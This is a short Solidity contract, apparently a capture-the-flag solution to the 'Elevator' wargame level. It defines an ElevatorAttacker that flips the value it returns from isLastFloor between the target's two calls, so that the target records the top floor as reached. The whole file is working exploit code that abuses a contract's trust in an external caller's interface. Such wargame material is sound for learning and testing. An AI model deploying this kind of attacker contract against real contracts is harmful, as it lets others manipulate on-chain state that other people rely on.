// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256) external;
}

contract ElevatorAttacker {
    address private target;
    bool private called = false;

    constructor(address _target) {
        target = _target;
    }

    function isLastFloor(uint256) external returns (bool) {
        bool _called = called;
        called = !called;
        return _called;
    }

    function attack() external {
        IElevator(target).goTo(1);
    }
}
